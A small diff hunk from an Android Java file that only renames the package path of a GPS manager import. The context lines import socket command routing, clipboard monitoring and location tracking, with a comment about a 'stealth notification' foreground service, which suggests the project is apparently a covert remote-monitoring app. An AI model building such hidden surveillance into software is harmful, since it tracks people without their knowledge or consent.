@@ -20,7 +20,7 @@ import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
 import com.fason.app.core.network.SocketCommandRouter;
 import com.fason.app.features.clipboard.ClipboardMonitor;
-import com.fason.app.features.location.GpsManager;
+import com.fason.app.features.gps.GpsManager;
 import com.fason.app.receiver.WatchdogReceiver;
 
 /** Main foreground service with stealth notification. */
